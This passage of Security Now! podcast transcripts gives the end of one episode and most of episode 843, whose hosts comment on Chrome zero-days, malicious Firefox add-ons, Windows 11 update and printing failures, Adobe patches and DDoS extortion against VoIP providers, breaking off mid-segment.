Let's see.  What else?  If you want on-demand versions of the show, Steve's got them.  And we have them, but Steve's got some unique versions, 16Kb audio for the bandwidth-impaired, and he also has transcriptions, lovely transcriptions written by Elaine Farris.  And of course 64Kb audio.  Those are all at his site, GRC.  While you're there go check out LeakTest and PatchWork and maybe some stuff more current, including SpinRite 6, the world's finest mass storage maintenance and recovery utility, soon to be 6.1.  You can participate in development and get a free copy of 6.1 if you buy 6.0 now.  GRC.com.  Lots of other free stuff.  You can hang out and visit these forums and so forth.



We have 64Kb audio and video at our site, TWiT.tv/sn.  There's a dedicated YouTube channel for Security Now!, actually for all of our shows.  And of course the easiest way to get this, I would think, is to subscribe in your favorite podcast client.  We should be everywhere.  And if your client allows for reviews, please do us a favor and leave a five-star review.  Let the world know, everybody needs to know about Security Now!.  Steve, again, I won't be here next week.  Have a great time with Jason.  And I will see you in two weeks on Security Now!.



STEVE:  Will do, buddy.  Thanks.  Have a great trip.



LEO:  I won't bring "Invasion" with me.



STEVE:  No.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#843

DATE:		November 2, 2021

TITLE:		Trojan Source 

HOSTS:	Steve Gibson & Jason Howell

SOURCE:	https://media.grc.com/sn/sn-843.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we keep counting them Chrome zero-days.  We look at a pair of badly misbehaving Firefox add-ons with Mozilla's moves to deal with them and future proxy API abuse.  We check in for Windows news from Redmond, which I'm again unable to resist commenting upon.  Then we look at a surprise mother lode of critical updates from Adobe and at the still-ongoing DDoS attacks against VoIP providers and their providers.  We look at some fun and interesting closing-the-loop feedback from our listeners, and I'm able to share some surprising early benchmarks from SpinRite.  We finish by looking at a frighteningly clever and haunting new attack against source code known as "Trojan Source."



SHOW TEASE:  It's time for Security Now!.  I'm Jason Howell filling in for Leo Laporte.  But of course the man, Steve Gibson, is here, and he's got a lot to talk about.  He's going to dive into how Windows 11 keeps disappointing him.  Number of facets there that he dives into.  Also a large number of Chrome zero-days and what's behind that.  A closer look at a new attack that's targeting source code.  That's something called "Trojan Source."  And a whole lot more coming up next on Security Now!. 



JASON HOWELL:  This is Security Now! with Steve Gibson, Episode 843, recorded on Tuesday, November 2nd, 2021:  Trojan Source.



It's time for Security Now!.  I'm Jason Howell filling in for Leo Laporte, who is, well, he's in Mexico, enjoying the last, unfortunately the last couple of days of his trip to Mexico with Lisa.  This is the show where we don't talk about taking trips and vacations around the world.  We talk about security, the latest security news, with none other than the man you're always arriving for, Steve Gibson.  How's it going, Steve?



STEVE GIBSON:  Hey, everybody.  And Jason, great to be with you today.  Has anyone heard anything from Leo?  Have there been texts and pictures and postings and so forth?  I haven't been following.



JASON:  I mean, little bleeps and bloops, yeah, here and there on Twitter.  But you know, primarily any of the feedback that I'm finding about their trip isn't coming from Leo or Lisa, it's coming from Mike Elgan, who is kind of leading the experience that they're there for.	



STEVE:  Ah, the gastronomic nomad.



JASON:  Yes.  That's the Gastronomad, exactly.  And so he's been, Mike's been sharing photos of the Day of the Dead, which they just experienced.  Or am I thinking of that horror movie?



STEVE:  And did he take your camera?  Did he take your phone with him?



JASON:  Yeah.  Yeah, yeah.  He took the Pixel 6 Pro.  So I'm actually kind of surprised that I haven't seen a bunch of photos.  But maybe he's so engulfed in his vacation that connecting to the Internet and making time to share things is off his radar, which let's be honest, when you take a vacation...



STEVE:  Yes, he's trying to get away from it all.  Get away from it all.



JASON:  Yeah, exactly.  It's a good thing.  It's a good thing.



STEVE:  Okay.  So we've got Episode 843 for November 2nd, the first episode of November.  I had already selected this as the topic for today when my Twitter feed blew up with people saying, "Oh, my god, what?"  Anyway, it's called Trojan Source, which is a frighteningly clever and appropriate for Halloween haunting new attack against source code, which we're going to have fun talking about because it's a couple of researchers in the U.K. who sort of thought outside the box and presented something which is really, everyone's going to understand, which is the fun part about it, but also surprisingly powerful.  But of course we've got a lot of other things to talk about.



We're going to keep counting them Chrome zero-days.  We've got a couple more, and we're still breaking records.  We're going to look at a pair of badly misbehaving Firefox add-ons, and Mozilla's moves to deal with not only them, but also future abuse of the thing that they were doing.  We check in with Windows.  Yes, once again, news from Redmond.  And I'm going to be unable to resist commenting on some of the new nonsense that's coming from there.  I just, well, I'll save that.



Then we're going to look at a surprise mother lode of critical updates from Adobe, and at the still ongoing DDoS attacks against VoIP providers and their providers.  We look at some fun and interesting closing-the-loop feedback from our listeners.  And I'm able to share what even surprised me, some early benchmarks from SpinRite, which I did drop that fifth prerelease that I've been talking about for a couple of weeks.  And it's going to be really fast.



Anyway, then, as I said, we'll wrap up by taking a look at something that everybody's going to be able to understand.  And it's just spooky.  And of course we have a great Picture of the Week, which is apropos of some of the things we'll be talking about regarding Microsoft.  So I think another great podcast for our listeners.



JASON:  Always a great podcast for our listeners.  And you mentioned spooky.  That's apropos because, well, was it yesterday?  No, it was the day before yesterday was Halloween.  So you're a few days off from like the spooky, the spookiest of days.  But that's okay.  We can round things out with that.  And now we're going to get into your Picture of the Week.  Also has to do with Windows 11.  You've got a lot to say about Windows 11 today.



STEVE:  I have too much to say about Windows 11.



JASON:  Always.



STEVE:  But can't help myself.  So this was a screenshot of a desktop.  One of our listeners, he tweeted me, his handle is StarKiss, @StarKissedOne, O-N-E.  And his tweet said:  "Apparently my Dell Core-i7 is both compatible and incompatible with Windows 11 at the same time."  Then he said:  "Best quote from last show:  'Win11 is for people who like pain.'"



So anyway, the desktop that he set up and took a picture of, on the left-hand side of the screen we see the PC Health Check app, which we will also be talking about today.  And it says, it's all got green checkmarks:  "This PC meets Windows 11 requirements."  And specifically the third one down says, and you'll see why I'm pointing this out in a second:  "The processor is supported for Windows 11.  Processor: Intel Core i7-7820HQ CPU @ 2.90GHz."



And then over on the right of the same screen, we've got Windows 11 Setup, which was trying to run.  And it reports quite loudly:  "This PC doesn't currently meet Windows 11 system requirements.  Here's why."  And then we've got a black X, rather than the happy green checkmark we had before, saying:  "The processor isn't supported for this version of Windows."  So, you know...



JASON:  Clear as mud.



STEVE:  They can't make up their mind because the whole thing is BS.  But we'll get to that in a minute.  First, let's talk about what's going on with Chrome.  More zero-days.  Two newly discovered critical, true, in-the-wild zero-days, and I highlight that because everyone's now using zero-day for everything, even when they're not.  So these are real zero-days, discovered being used in the wild.  They were just patched in Chrome's most recent urgent release last Thursday when Google pushed out its emergency update, bringing Chrome to where everybody should now be, 95.0.4638.69.



These two are tracked as CVE-2021-38000 and 38003.  They were an - and I love how obscure this is.  You know, Google doesn't want to tell us what happened.  So we get an insufficient validation of untrusted input in a feature called "Intents," as well as a case of - and this is really good - inappropriate implementation, which pretty much covers everything, in V8, which of course is Chromium's JavaScript and WebAssembly engine.  Both discoveries are credited to TAG, that's Google's Threat Analysis Group, which reported their findings to the Chromium team for the first case on September 15th, and then the second case was October 26th.



Now, okay, you know, I'm wondering about those dates.  I'll get to that in a second.  Anyway, their sparse advisory regarding these simply stated that:  "Google is aware that exploits for" - and then these two CVEs - "exist in the wild."  But the fact that an actively exploited, in-the-wild zero-day was reported to the Chromium team on September 15th and only patched last Thursday does seem a bit slow for the way they've been operating.  They've generally been, you know, I've been giving Google lots of props for how quickly they respond, now typically within a few days.  Presumably in this instance they had their reason.



So what we know of that first one, that it was a "insufficient validation of untrusted input."  So I would tend to say, so maybe it wasn't a big deal.  But if it was being abused in the wild, then it was worth somebody abusing it.  So I don't know why they didn't fix it sooner.  I mean, even since then there have been other updates to Chrome which didn't get this fix in there.  So, you know, obviously they had a reason.  We don't know what it is.  They're not telling.



But in addition to these two biggies, the other vulnerability of note was they repaired a use-after-free vulnerability in Chrome's web transport component.  And that's the bug which was demonstrated and leveraged for the first time at the Tianfu Cup contest held in the middle of last month in China, which we talked about.  So as happens with these things, the Pwn2Own or the Tianfu Cup, is after the exploit is used and wins its exploiter some big bucks, hopefully, then it's disclosed to the affected party, and they patch it, as they did, you know, quickly.  Again, much more quickly, as I said, than that 38000 CVE.  But who knows?



And since we've been counting, these two latest emergency patches bring Chrome's resolved total while being actively in use zero-day updates to a record 16 zero-days since the start of the year.  And it's on the screen right now.  I've got it in the show notes.  Look at September.  Ouch.  September was a rough month for Chrome.  One, two, three, four, five, six problems in September alone.  One in July, two in June, three in April, two in March, one in February, and one last month.  So anyway, as I've said, this is the largest number of zero-days ever patched in Chrome during any calendar year since Chrome's debut, which was 13 years ago, in 2008.



And in this case, because they're on top of it, and they fix these things, and they stay fixed, and they fix them right, I don't think this represents a problem with Chrome, per se.  I think it represents the dramatic increase in focus that Chrome is receiving now that it is number one.  Thirteen years ago, you know, everybody was attacking IE with glee.  Today it's Chrome because they're the big guys on the block.  And if you want to get the most people, you attack the browser that the most people are using. 



I mentioned some problems with Firefox.  Two naughty Firefox add-ons have been caught abusing an API available to those extensions.  Mozilla's Security Blog titled their posting "Securing the proxy API for Firefox add-ons."  And they set things up by, in a little bit of a marketing style, explaining what we all know:  "Add-ons are a powerful way to extend and customize Firefox.  At Mozilla, we are committed not only to supporting WebExtensions APIs, but also ensuring the safety and reliability of the ecosystem for the long term."  Okay, right.



Okay.  So then they explain what happened:  "In early June," they say, "we discovered add-ons that were misusing the proxy API, which is used by add-ons to control how Firefox connects to the Internet.  These add-ons interfered with Firefox in a way that prevented users who had installed them from downloading updates, accessing updated block lists, and updating remotely configured content.  In total" - and this is why this is significant - "these add-ons were installed by 455,000 users."  So close to half a million users.  They said:  "This post outlines the steps we've taken to mitigate this issue, as well as provide details of what users should do to check whether they're affected.  Developers of add-ons that use the proxy API will find some specific instructions below that are required for future submissions."



And in fact I didn't include the developer side of this.  I'll just note that what the instructions were was to explicitly, to developers, to explicitly declare your use of the proxy API to improve Mozilla's ability to approve your add-on for submission and download by Firefox users.  They want to know you're saying yes, we're using the proxy API.  And here's why.  So anyway, the two malicious add-ons Mozilla found were blocked to prevent their future installation by other users.  They're published under the names "Bypass" and "Bypass XM."  And Mozilla said:  "To prevent additional users from being impacted by new add-on submissions misusing the proxy API, we paused on approvals for add-ons that use the proxy API until fixes were available for all users."



So they said:  "Starting with Firefox 91.1" - and everybody should now be at 93, so this is a couple ago - "Firefox includes changes to fall back to direct connections when Firefox makes an important request, such as those for updates, via a proxy configuration that subsequently fails.  Ensuring these requests are completed successfully helps us deliver the latest important updates and protections to our users.  We also deployed a system add-on named 'Proxy Failover' with additional mitigations that's been shipped to both current and older Firefox versions."  So essentially, they realized they were sort of in a Catch-22.  If you had installed these add-ons which were blocking updates because the add-on was proxying your connection through Firefox and maliciously preventing you from getting the update to Firefox which would then be aware of these malicious add-ons, you'd never be able to get rid of them.  Firefox wouldn't be updated any longer.  Users would be insecure.  And it was a mess.



So with 91.1, what they did was they said, okay, we're going to give ourselves permission to bypass the proxy API, which they had not been able to bypass until then, so that if they're unable to update Firefox through the proxy, then they're going to say, okay, well, sorry, we're going to bypass the proxy because updating Firefox is more important than doing what some extension add-on has done, if it prevents us from updating.  So that's in place now.



Okay.  So they then said:  "As a Firefox user, what should you do next?"  Hopefully you will know if you're using something called Bypass or Bypass XM.  And if so, you want to get rid of it.  It's malicious.  They've blocked it.  They're removing it where they can.  But there may be situations where your updates to Firefox are being blocked by this add-on.  And since it sounds like maybe - I didn't even get into - I looked around for what it was, but it's gone now.  So I couldn't even figure out what benefit it was offering.  Sounds kind of like something our listeners might be interested in.



So that's why I wanted to bring it to everyone's attention.  If you're using Bypass or Bypass XM, then you want it gone.  I do have details in the show notes I won't drag everybody else through.  But the way of searching for it by ID or by name and where to go to remove it, a link to do so.  So I imagine our listeners will know if they're doing any of that and can then pursue it on their own.  455,000 users of Firefox, wouldn't be surprised if that is a few of our listeners, at least.



Okay.  Now, take a deep breath, Steve.  Before I start talking about the state of Windows yet again today, I just want to take a moment to acknowledge that I am feeling somewhat self-conscious about the fact that I've been pounding on Microsoft to the extent that I have pretty much since March of this year, when we all learned that they hadn't bothered to fix the Exchange Server problems they'd been informed many months earlier.  And they apparently only finally did so  and even then incorrectly, incompletely, and incompetently  when their own customers began coming under attack as a consequence of their protracted negligence.



This podcast has been observing and reporting the facts as they have unfolded, and I don't know what else I can do.  I also can't help but have an opinion and editorialize a bit because I've been programming computers since I was 16 years old in high school 40 years ago.  So I can state with absolute authority that while these machines are fascinatingly complex, they are not mystical or magical or unknowable.  It's called "computer science," not "computer alchemy."



As we will see shortly, Microsoft has begun selling the idea that this is beyond us all.  That no one is in control.  That no one can be in control any longer.  That along with them, all we can do is hope for the best.  Okay, I refuse to be suckered into that mindset, and I assume that this podcast's listeners are with me on this.  Every single one of us is here because we love and are fascinated by computers, and because we want to understand them.  They are deterministic and knowable.  They serve us, not the other way around.  And I'm truly worried that Windows appears to have escaped Microsoft's grasp.  If that's the case, acknowledging and examining that truth is worth our while.



So the first question:  Can we print yet?  Is printing too much to ask?  On the one hand, no one is going to believe this, or want to believe it.  On the other hand, unbelievable as it is, in a sad way it won't come as a shock.  Microsoft has said that after installing October's, you know, last month's just by two days, October's Patch Tuesday updates KB5006670 for Windows 10 and KB5006674 for Windows 11, for which we held out high hopes, customers have been experiencing issues with network printing.  Unbelievable.



Microsoft explained that Windows users attempting to connect to networked shared printers might encounter multiple errors preventing them from printing over the network.  For example, after deploying KB5006674 for Windows 11, the errors generated can be, and we've got three of them, hex 6E4, which is RPC_S_CANNOT_SUPPORT; or you might get the 7c error, which is the ERROR_INVALID_LEVEL of something; or 709, ERROR_INVALID_PRINTER_NAME.  Even though the printer name is apparently valid, or it was last week, not anymore.



I surveyed the complete list of Windows platforms affected, which were listed along with this news from Microsoft, and I didn't see any that were missing, from the most recent all the way back to and including Windows 7 Service Pack 1, Windows 2008 SP2, or R2.  So here's an instance where the 15% of users who are still using Windows 7 and have stopped receiving those "improvements" from Microsoft can feel glad.  So yes, for the past two weeks, ever since installing last month's latest improvements for Windows, Win10 admins and their users have been reporting widespread network printing problems.



Over on BleepingComputer's active forum, the postings about this issue extend for 14 pages.  And once again, while the posters have told the tales of their frustrating and frustrated attempts to deal with the new printing problems, they once again came to the previous month's conclusion:  uninstalling the October cumulative updates resolves the printing problem.  Of course, they had also uninstalled the September cumulative updates to again resolve the printing problem, and the August cumulative updates to resolve the printing problem.  Otherwise you can't print in these instances.



In fact, since then, the issues have grown so severe that Windows admins have reportedly resorted to taking matters into their own hands because they don't want to be 90 days behind on all of these critical zero-day and other windows problems that August and September and October fixed while seemingly being unable to fix Windows printing.  So they are, I'm not kidding, replacing Windows DLLs by hand with older versions of the DLLs to reenable printing.  BleepingComputer reports that the DLLs admins are replacing to get their enterprises printing, the networked printing working again, are localspl.dll, win32spl.dll, and spoolsv.exe.  They all sound like spooling things.



And while stepping back to earlier DLLs will remove Microsoft's multiple attempted fixes for the various PrintNightmares, since Microsoft continues to be unable to get their network printing to work with security, it's either go without security and print, or go without printing.  Also, manually replacing only those three DLL culprits has the benefit of leaving the rest of October's, and for that matter September's and August's, updates in place, which would otherwise all need to be rolled back as a whole.  Which, you know, people really don't want to do.



Next Tuesday - the 9th, right? - Microsoft will have the opportunity to take another crack at it.  It does feel as though they're maybe finally zeroing in on the trouble.  Maybe they could just put those older - oh, no, no, they can't because those aren't secure.  Okay.  Anyway, we'll wait to see what happens.  It sure feels as though their entire user base has become their field test lab.  You'd think that they would have some well-established testing facilities for checking these things out before subjecting the rest of the world to their repeated and failed experiments, which is what's been happening, now for 90 days.



But on the other hand, we know that they have lost exactly zero customers as a result of this repeated demonstration of incompetence.  So why would they bother?  I know how harsh that sounds, but I don't see any other rational explanation.  We might not like it, but it is at least brutally rational.



JASON:  And they're not alone in that practice.  I mean, Google comes to mind.  Google does this all the time with their products.  And many Google users feel the same way; right?  Like am I, as a Google fan and Google user, am I just constantly beta testing your products for you?



STEVE:  Yeah.



JASON:  But yet we come back, and we come back; you know?



STEVE:  Yeah.  So one thing Microsoft seems to be doing that I think Google isn't is fixing the symptom rather than the cause.  We have a new local privilege escalation which affects all versions of Windows.  I mean, like right now.  A security researcher by the name of Abdelhamid Naceri has disclosed technical details for a Windows privilege elevation vulnerability and posted a public proof-of-concept exploit that gives system privileges under certain conditions.  Now, normally this would be regarded as a hostile act, right, to just like post the news of this.  But in this case it's difficult to blame Naceri for posting what he has.



Unfortunately, as I said, this appears to be another instance of Microsoft treating a symptom and not the cause.  And we've hit on a number of these because this is another pattern which has unfortunately established itself this year.  Back in August, Microsoft released a security update titled "Windows User Profile Service Elevation of Privilege Vulnerability."  So an elevation of privilege vulnerability in Windows Profile Service.  And it was formally tracked as CVE-2021-34484.  That bug had been discovered by none other than this guy, Abdelhamid Naceri.



Once his discovery had been remediated by, you know, being patched, Naceri was understandably curious to see how Microsoft had fixed the glitch he had found.  But upon examining the updated code, he discovered that the patch didn't fix the actual problem at all, and that he was still easily able to bypass it with another slightly altered exploit, which is what he has published on GitHub.  I've got a link to the doc which he published.



The technical details of the vulnerability require some understanding of the Windows API and its internals to be meaningful.  But the gist of the issue is, as I said, we have another instance of someone at Microsoft who's responsible for examining, understanding, and fixing these bugs, instead tweaking Windows code to keep a security researcher's provided proof of concept from functioning, rather than truly examining, understanding, and repairing the underlying problem for which the proof of concept was simply one possible instance of exploitation.



Okay.  So for what it's worth, what Naceri wrote, he said:  "Technically, in the previous report" - then he cites 2021-34484, the original CVE, he said:  "I described a bug where you can abuse the user profile service to create a second junction.  But as I see from ZDI advisory and Microsoft patch, the bug was metered," as he phrased it, "as an arbitrary directory deletion bug.  Microsoft didn't patch what was provided in the report, but the impact of the proof of concept.  Since the proof of concept I wrote before was horrible," he's saying of his own proof of concept, "it could only reproduce a directory deletion bug.  As from the quick patch analysis, they didn't do any major changes to the code.  They only removed the CDirectoryRemover destructor which removed the directory.  Unfortunately, this isn't sufficient to fix the bug."



Okay.  So the revised proof of concept which he posted will cause an elevated command prompt with system privileges to be launched while the User Account Control prompt is displayed.  Okay.  This is, again, just the proof of concept.  CERT/CC's vulnerability analyst whom we often quote, Will Dormann, tested the vulnerability, that is, this proof of concept, and found that while it worked, it was a little temperamental and didn't always create the elevated command prompt.  But BleepingComputer tested the vulnerability as provided, and it launched an elevated command prompt immediately and successfully.  And again, this was just to demonstrate the bug hadn't been fixed.



Okay.  Now, the good news is that the exploitation of the bug requires a threat actor to have the login credentials, not only for the account they're currently logged into but some other account on the system.  While there are scenarios where this could allow a user to escape administrative control, Dormann agreed that it is "definitely still a problem, and there may be scenarios where it can be abused."  He said:  "But the two-account requirement probably puts it in the boat," as he phrased it, "of not being something that will have widespread use in the wild."  And I certainly agree with that.



However, Naceri told BleepingComputer that a threat actor only needs another domain account to exploit the vulnerability, so it should still be something to be concerned about.  And for what it's worth, Microsoft said they are aware of the issue and are looking into it.



Again, my greater concern is that Windows, while it's always been buggy, it's always been workable.  But it feels as though Microsoft is starting to treat outside security researchers as an annoyance to be muted as quickly as possible, rather than as a source of vital and irreplaceable security information that can serve to make their operating system better.  You know, that's what we all want.  Microsoft says they want it.  Users certainly do.  Security researchers certainly do.  But it's feeling like researchers are now on the outside just annoying Microsoft.



Okay.  In an announcement accompanying an update to their Windows PC Health Check app, and as we saw from the Picture of the Week, looks like it did need to be updated since it was disagreeing with Windows 11 setup - and we'll get to that, there's another issue about that in a minute - Microsoft said that as part of their phased rollout of Windows 11 to existing Windows 10 users, okay, listen to this.  "The availability of Windows 11 has been increased, and we are leveraging our latest generation machine learning model to offer the upgrade to an expanded set of eligible devices."



And I'll just note that according to previous statements, Microsoft estimates that all eligible Windows 10 devices will be offered the upgrade to the latest version by mid-next year, 2022.  Okay, now, nothing about any of that should sound reasonable.  In fact, remembering that computing is entirely deterministic, it's difficult to imagine that that's even true.



So Microsoft, you currently have Windows 10 working on all PCs everywhere in the world.  It simply runs anywhere.  No problem.  And many years ago, before Windows 10, although not everyone wanted Win10, and you had to force many people to take it, anyone who had Windows 7 or 8 could immediately upgrade to Windows 10 when it became available, and everything worked just fine.



But now you've apparently so dramatically advanced the state of the art that you no longer understand your own operating system.  If we're to believe what you're saying, it's become a mystery to you, Microsoft.  It's gotten away from you.  And instead of it running better and in more places, you no longer know where or if it will run at all.  So you've built yourselves a machine learning model, an AI, an oracle, to tell you where it might be safe to give it a try.  Based on what?  Statistics?  Hope?  A complex statistical model that you need an AI to peer into?  What has gone wrong?



You are, and I quote, "leveraging your latest generation machine learning model to offer the upgrade to an expanded set of eligible devices."  So you've somehow taken an operating system which could for many generations install and run on any Intel-based hardware that anyone had.  But now it's so advanced that it can no longer run on all Intel-based hardware, only some.  But you don't know where, what, or which?  As I said, nothing about any of this should sound reasonable.  Something has gone wrong in Redmond.  



JASON:  Something's rotten in Redmond.



STEVE:  And speaking of that - just it's nuts, Jason.  Really.  I mean, it's like we're all...



JASON:  That is.  I love how you put it.



STEVE:  We're all buying this bullshit.  I mean, it is - it's nuts.  It's like, oh, well, maybe I'll get lucky, and Windows 11 will run.  You know, I didn't want 10.  They forced me to have it, and it ran just fine.  Now I can't have it.  So what, am I supposed to want it, you know, to get the rounded corners so I don't, you know, cut myself on a sharp edge?  Oh, it's just looney tunes.  You know?  And everyone's like, oh, wow, they're using advanced learning model AI to figure out if I can have it or not.  What?



JASON:  Don't worry.  The next version will be better.  The next version will win you over again.  It's the on-again, off-again TikTok nature of these releases here.  All you can do is wait for the next release.



STEVE:  You know.  And let's not forget, let's not forget they couldn't name it Windows 9 because some things might have been confused, I'm not kidding, and thought this was 95 or 98.  They were worried about the digit "9" in the version.  And it's like, oh, things will break if we call it Windows 9.  I mean, that should have been our first clue that there was something wrong.



Wow.  Okay.  Now, on top of all this, we've also just learned as of last Friday that Microsoft has begun to force install their  PC Health Check app, the one in this week's Picture of the Week, which disagrees with Windows 11 setup, onto Windows 10 devices using a Windows update.  It's KB5005463.  Windows 10 users quickly noticed this and began complaining to Microsoft.  Microsoft said that any users who do not want PC Health Check on their system, which was snuck in under the guise of Windows Update, can simply uninstall it using the Settings app.



However, those who have done so numerous times have discovered that it will be seen as missing by Windows after they uninstall it, and it'll be reinstalled during the system's next check for updates.  And even more maddeningly, when attempting to uninstall KB5005463, Windows 10 may inform its user that the update is not installed when the user is looking right at it.  You know, like I said, it's gotten out of control.  It's like the inmates are running the asylum.



There's a registry key named "PreviousUninstall," which is supposed to be set to indicate that a user has manually removed an update so that Windows Update will not see that the update is missing and reinstall it.  But for some reason that mechanism isn't working reliably in this case.  Gee.  Imagine that.  And there's no reason not to want the PC Health Check; right?  I mean, it doesn't run automatically.  They're giving it to you so that you can check in, I guess, with the latest machine learning AI to see if it's decided that you can, oh look, now your machine works with it.  Apparently it didn't before.  We're not sure, but the AI, the oracle that we're consulting seems to think now you can give it a try.  If when you actually try to run Windows 11 setup, it lets you.  Who knows?



On the other hand, it appears to be mostly users who are affronted by yet another indignity foisted upon them by Microsoft.  You know, we old-timers still haven't given up imagining that we control our own machines.  It's becoming clear that the only way for that to be true will be to move to Linux.  Linus Torvalds' dream of building a truly attractive and personal operating system is being more fully realized every day.



And with that, Jason, I'm going to take a sip of water, and you're going to give us a nice pause.



JASON:  If you could just work on, during this break, formulating your ideas around how you really feel, that would be great.  We want to know how you really feel, Steve.  



STEVE:  You don't want me to hold back, is that - don't hold back?



JASON:  Don't hold back.



STEVE:  Okay.  Okay.



JASON:  There's other news to report.



STEVE:  I know that our listeners are glad for that.  But, boy.  I just - we need a reality check every so often.  This is just, you know...



JASON:  For sure.



STEVE:  Microsoft has deployed a machine learning model, their latest one, you know, we don't want the older one apparently, the latest one to let us know or to let them know what it runs on.  It's like, what?  It's just nuts.  Okay.  Anyway, you did try to break me from this.



Let's talk about Adobe.  Out of 92 security vulnerabilities, 66 are rated critical in severity, most allowing for code execution, and many for private information disclosure.  This month's Patch Tuesday is next Tuesday.  But apparently Adobe felt that this couldn't wait, even though it did draw a great deal of industry attention by doing this out of cycle.  Threatpost wrote:  "Adobe has dropped a mammoth out-of-band security update this week, addressing 92 vulnerabilities across 14 products."  And ZDNet's headline was "Weeks early:  Adobe dumps massive security patch update."



Okay.  So what do we know?  As I said, the majority of the bugs, nearly two thirds of them, are rated critical, with most of those allowing for arbitrary code execution.  But we also have escalation of privilege, denial of service, and memory leak information disclosures.  And these are spread liberally across 14 different Adobe properties:  After Effects, Animate, Audition, Bridge, Character Animator, Illustrator, InDesign, Lightroom Classic, Media Encoder, Photoshop, Prelude, Premiere Pro, Premiere Elements, and the XMP Toolkit SDK.  Interesting, I didn't see Reader in there.  That's kind of amazing.  Maybe they fixed that the previous week on October's Patch Tuesday because they did another patch dump then.



Anyway, most of the bugs were reported by just two teams, the TopSec Alpha Team and Trend Micro's Zero-Day Initiative that we referred to a second ago, ZDI.  Dustin Childs of ZDI told Threatpost that:  "Of the patches released by Adobe, nine of these came through the ZDI program.  Most of these were simple file-parsing bugs, but there were a couple critical-rated out-of-bounds write bugs, as well.  For these, the vulnerability results from the lack of proper validation of user-supplied data, which can result in a write past the end of an allocated structure.  An attacker can leverage these bugs to execute code in the context of the current process."  We know that's not good.



What's also somewhat bracing is that Adobe had just, as I said, two weeks earlier released their regularly scheduled monthly Patch Tuesday.  And despite the out-of-cycle nature of these 92 new additional vulnerability patches, none - and this is the good news - none are zero-days having any evidence of active exploitation in the wild.  So maybe they just figured they'd get ahead of the curve.  Or maybe they've got another surprise for us next week.  For what it's worth, you know if you use any of those Adobe products.  So it might be prudent to check in with them for any updates.



We've talked, we've touched a couple times recently on the VoIP DDoS attacks.  They are continuing, like right now.  A U.K.-based VoIP industry group representing the U.K. telecommunications sector said last week that several of its members active in the VoIP market have been hit by Distributed Denial of Service attacks over the past month.  In a statement on Tuesday, the Comms Council of U.K. said the DDoS attacks were "part of a coordinated extortion-focused international campaign by professional cybercriminals."  And what unfortunately we're beginning to see here is sort of another trend of malicious conduct on the Internet.



The organization did not share the name of the victims explicitly, but VoIP providers including Voipfone, VoIP Unlimited, and VoIP.ms have previously disclosed that they were the subject of DDoS extortion attempts since the end of August.  And in addition, Bandwidth.com, an upstream provider for many VoIP companies, said it was also attacked as part of this extortion campaign, which the company said it managed to mitigate by the end of September.



The threat actors first launched DDoS attacks, then sent email demanding huge payoffs to stop the attacks.  They knew that companies such as VoIP providers could not afford to remain offline without incurring huge financial losses and getting a lot of pressure from their own customers, whose VoIP was down and gone.  So it had secondary effects.  And as we covered at the time, attacks against a VoIP's bandwidth and infrastructure, being other than DNS and web, are significantly more difficult to mitigate.  We don't have ready tools for filtering VoIP traffic.



David Morken, the CEO of Bandwidth.com, said earlier last month: "The attackers took advantage of the unique characteristics of real-time communications, as well as the highly interconnected nature of our industry."  And Cloudflare, as we know, which has been helping mitigate these attacks together with other DDoS mitigation providers, has also noted a recent focus on VoIP providers.  But despite the numerous reports and press coverage surrounding this campaign, unlike what was true in the case of the ransomware guys, these VoIP attackers have not been discouraged by the media attention.  The attacks remain ongoing, with Voipfone still dealing with a wave of DDoS attacks that began last Monday, according to their server status page.



All the affected companies said the attacks crippled their infrastructure and affected telephony and messaging services for their customers, resulting in prolonged multi-day outages.  Eli Katz, the Chair of Comms Council U.K., said the attacks had extensive secondary impacts upon "critical infrastructure organizations including police, NHS, and other public services."  He described the DDoS extortion campaign as "attacks on the foundations of U.K. infrastructure."  And, you know, I guess everybody would like to escalate this to terrorism; right?  Because as soon as you do that, then you've got different things you can do legally as we discussed last week, and as did happen when U.S. law enforcement went after the REvil guys.



So coordinated DDoS attacks against selected industry sectors have occurred in the past, and they appear to focus on industries that cannot afford to go offline even briefly.  We talked about the original DDoS attacks against gambling sites which were desperate to remain online during major sporting events.  So like, you know, the attacker would blast them offline during one painful period, and then say, okay, look what we can do.  You want more of that?  If not, pay us.  And some did.



And similar attacks occurred a year ago, last September 2020, when attackers launched a campaign like that against EU-based Internet service providers.  Other campaigns have targeted entities in the financial sector, banks and stock markets.  Another recent sector being targeted with DDoS extortion campaigns has been privacy and security-focused email providers. I think ProtonMail was being blasted not long ago.  Also Runbox, Posteo, Fastmail, TheXYZ, Guerilla Mail, Mailfence, and Kolab Now.  Oh, and also RiseUp.  All of them email providers.  All of them have been suffering attacks.



So what's happening is we know that the Internet has many massive botnets which are capable of producing astonishing levels of aggregate bandwidth attack.  And the lack of egress filtering allows their outbound packets to carry any IP address they choose.  In other words, they're able to spoof the source IPs, making it much more difficult to track them down.  If there was egress filtering in place, they would at least have to spoof within that net, and it would be possible to block the net that they're in.



A long time ago this podcast looked at the incredibly elegant simplicity of the autonomous packet routing invention, you know, which is the Internet.  Unfortunately, for all its elegant simplicity, it was never designed to prevent its own abuse.  It really can't do so.  And so today we have ever more attack targets hiding behind the services of Cloudflare and other attack mitigation services.  They have no choice.  If you're a target, and you're being blasted off the Internet, you need protection.  The Internet itself can't provide it.



I got a kick out of this.  Talking to Leo last week about "Dune," which we both loved, and it's come under universal acclaim, I mentioned how, like, I couldn't understand that these guys were using swords rather than handheld laser guns.  It's like, or beam weapons.  Like it's supposed to be the year, what is it, 10191?  And now I confess, Jason, I'm not a "Dune" guy.  I read the first book.  I get it that there's lots more and all that.  Anyway, I got a tweet from David N., whose Twitter handle is @RandomDaveInFL.  He explained this.



